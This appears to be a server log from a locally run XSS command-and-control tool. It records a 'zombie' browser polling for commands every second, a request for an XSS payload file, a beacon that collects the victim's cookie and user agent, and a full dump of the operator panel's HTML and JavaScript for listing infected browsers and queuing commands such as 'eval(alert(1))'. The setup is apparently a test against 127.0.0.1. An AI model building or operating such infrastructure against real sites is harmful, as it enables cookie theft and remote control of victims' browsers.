2025-06-24 23:20:53 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0020s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:20:53 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:20:53] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:20:54 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:20:54 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:20:54 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:20:54 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:20:54] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:20:55 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:20:55 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:20:55 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:20:55 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:20:55] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:20:56 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:20:56 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:20:56 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:20:56 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:20:56] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:20:57 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 xss_payload()
2025-06-24 23:20:57 | INFO     | control_route.py:125 | xss_payload() | 用戶請求XSS載荷文件
2025-06-24 23:20:57 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] xss_payload 執行完畢 (耗時: 0.0003s) -> 回傳: <Response 2102 bytes [200 OK]>
2025-06-24 23:20:57 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:20:57] "GET /api/control/xss_payload HTTP/1.1" 200 -
2025-06-24 23:20:57 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-24 23:20:57 | INFO     | control_route.py:18 | add_message() | 用戶請求添加消息 (POST)
2025-06-24 23:20:57 | INFO     | control_route.py:41 | add_message() | 消息添加成功，目標IP: 127.0.0.1,消息: {"where":"http://127.0.0.1:8000/","target_ip":"127.0.0.1","cookie":"","user_agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36","time_stamp":"2025-06-24T15:20:57.064Z"},時間: 2025-06-24 23:20:57.069801
2025-06-24 23:20:57 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0041s) -> 回傳: <Response 237 bytes [302 FOUND]>
2025-06-24 23:20:57 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:20:57] "[32mPOST /api/control/add_message HTTP/1.1[0m" 302 -
2025-06-24 23:20:58 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:20:58 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:20:58 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:20:58 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:20:58] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:20:58 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-24 23:20:58 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-24 23:20:58 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0009s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                    </div>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> 127.0.0.1</p>\n            <p><strong>目標配置:</strong> {&#34;where&#34;:&#34;http://127.0.0.1:8000/&#34;,&#34;target_ip&#34;:&#34;127.0.0.1&#34;,&#34;cookie&#34;:&#34;&#34;,&#34;user_agent&#34;:&#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36&#34;,&#34;time_stamp&#34;:&#34;2025-06-24T15:20:57.064Z&#34;}</p>\n            <p><strong>建立時間:</strong> 2025-06-24 23:20:57.066659</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n</script>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-24 23:20:58 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:20:58] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-24 23:20:58 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:20:58] "[36mGET /static/css/control_message.css HTTP/1.1[0m" 304 -
2025-06-24 23:20:58 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:20:58] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 23:20:59 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:20:59 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:20:59 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:20:59 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:20:59] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:21:00 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:21:00 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:21:00 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:21:00 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:21:00] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:21:01 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:21:01 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:21:01 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:21:01 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:21:01] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:21:02 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:21:02 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:21:02 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:21:02 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:21:02] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:21:03 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:21:03 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:21:03 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:21:03 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:21:03] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:21:04 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:21:04 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:21:04 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:21:04 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:21:04] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:21:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:21:05 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:21:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:21:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:21:05] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:21:06 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:21:06 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:21:06 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:21:06 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:21:06] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:21:07 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:21:07 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:21:07 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:21:07 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:21:07] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:21:08 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:21:08 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:21:08 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:21:08 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:21:08] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:21:09 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:21:09 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:21:09 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:21:09 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:21:09] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:21:09 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_zombies()
2025-06-24 23:21:09 | INFO     | control_route.py:174 | get_zombies() | 用戶請求獲取殭屍機器列表
2025-06-24 23:21:09 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_zombies 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 76 bytes [200 OK]>
2025-06-24 23:21:09 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:21:09] "GET /api/control/get_zombies HTTP/1.1" 200 -
2025-06-24 23:21:10 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:21:10 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:21:10 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:21:10 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:21:10] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:21:11 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:21:11 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:21:11 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:21:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:21:11] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:21:12 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:21:12 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:21:12 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:21:12 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:21:12] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:21:13 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:21:13 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:21:13 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:21:13 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:21:13] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:21:14 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:21:14 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:21:14 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:21:14 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:21:14] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:21:15 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:21:15 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:21:15 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:21:15 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:21:15] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:21:16 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:21:16 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:21:16 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:21:16 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:21:16] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:21:17 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:21:17 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:21:17 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:21:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:21:17] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:21:18 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:21:18 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:21:18 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:21:18 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:21:18] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:21:19 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:21:19 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:21:19 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:21:19 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:21:19] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:21:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:21:20 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:21:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:21:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:21:20] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:21:21 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:21:21 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:21:21 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:21:21 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:21:21] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:21:22 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:21:22 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:21:22 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:21:22 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:21:22] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:21:22 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_command_to_do(zombie_ip='127.0.0.1')
2025-06-24 23:21:22 | INFO     | control_route.py:197 | add_command_to_do() | 用戶請求為殭屍機器 127.0.0.1 添加命令
2025-06-24 23:21:22 | INFO     | control_route.py:225 | add_command_to_do() | 成功為殭屍機器 127.0.0.1 添加命令: eval(alert(1))
2025-06-24 23:21:22 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_command_to_do 執行完畢 (耗時: 0.0046s) -> 回傳: <Response 237 bytes [302 FOUND]>
2025-06-24 23:21:22 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:21:22] "[32mPOST /api/control/add_command_to_do/127.0.0.1 HTTP/1.1[0m" 302 -
2025-06-24 23:21:22 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-24 23:21:22 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
